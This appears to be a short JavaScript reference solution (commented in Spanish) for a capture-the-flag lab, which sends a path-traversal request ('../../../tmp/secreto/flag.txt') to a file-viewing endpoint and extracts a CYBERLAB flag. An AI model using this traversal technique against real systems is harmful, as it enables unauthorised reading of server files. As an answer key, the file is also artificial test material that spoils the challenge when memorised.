// Solución de referencia: subir con "../" desde la carpeta de documentos hasta /tmp/secreto.
export default async function solve({ request }) {
  const res = await request("/ver?archivo=../../../tmp/secreto/flag.txt");
  return res.text.match(/CYBERLAB\{[^}]+\}/)?.[0] ?? null;
}
